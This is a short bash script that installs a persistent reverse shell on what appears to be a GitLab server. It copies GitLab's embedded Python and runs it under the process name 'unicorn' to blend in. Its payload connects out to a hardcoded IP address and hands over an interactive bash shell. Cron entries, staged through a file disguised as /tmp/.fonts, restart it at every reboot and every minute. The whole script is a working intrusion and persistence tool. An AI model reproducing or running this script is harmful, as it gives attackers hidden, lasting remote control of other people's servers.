#!/bin/bash

# Prompt user
echo "[+] Enter your listener port number:"
read PORT

echo "[+] Enter the directory where files should be stored:"
read TARGET_DIR

LISTENER_IP="172.105.118.102"

# Change to target directory
cd "$TARGET_DIR" || { echo "[-] Failed to cd to $TARGET_DIR"; exit 1; }

# Copy python binary and make it executable
cp /opt/gitlab/embedded/bin/python3 unicorn.bin
chmod +x unicorn.bin

# Create the launcher script "unicorn"
cat << 'EOF' > unicorn
#!/bin/bash
exec -a "unicorn" ./unicorn.bin master
EOF
chmod +x unicorn

# Create Python payload "master" with Bash variables expanded
cat << EOF > master
import socket, subprocess, os, time

while True:
    try:
        s = socket.socket()
        s.connect(("${LISTENER_IP}", ${PORT}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash","-i"])
    except:
        time.sleep(60)
EOF

chmod +x master

# Create cron job
crontab -l 2>/dev/null > /tmp/.fonts || true
echo "@reboot $TARGET_DIR/unicorn" >> /tmp/.fonts
echo "* * * * * $TARGET_DIR/unicorn" >> /tmp/.fonts
crontab /tmp/.fonts
rm /tmp/.fonts

echo "[+] Setup complete."
echo "[+] To run immediately:"
echo "    bash -c 'exec -a \"unicorn\" $TARGET_DIR/unicorn.bin master'"
